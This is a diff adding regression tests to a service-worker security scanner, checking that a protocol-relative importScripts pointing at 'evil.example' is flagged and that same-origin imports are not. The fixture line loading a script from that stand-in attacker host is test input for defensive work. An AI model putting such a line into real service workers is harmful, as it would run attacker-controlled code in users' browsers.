@@ -14,6 +14,18 @@ describe('findSwSecurityIssues', () => {
     expect(findSwSecurityIssues('sw.js', content)[0]).toMatch(/external importScripts/);
   });
 
+  it('flags a PROTOCOL-RELATIVE remote importScripts (regression)', () => {
+    // `//evil/x.js` has no scheme but still loads cross-origin code.
+    const content = 'importScripts("//evil.example/x.js")';
+    expect(findSwSecurityIssues('sw.js', content)).toHaveLength(1);
+    expect(findSwSecurityIssues('sw.js', content)[0]).toMatch(/external importScripts/);
+  });
+
+  it('does not flag a same-origin relative importScripts', () => {
+    expect(findSwSecurityIssues('sw.js', 'importScripts("sw-push.js")')).toEqual([]);
+    expect(findSwSecurityIssues('sw.js', 'importScripts("/assets/wb.js")')).toEqual([]);
+  });
+
   it('flags eval()', () => {
     expect(findSwSecurityIssues('sw.js', 'const x = eval("1+1");')).toHaveLength(1);
   });
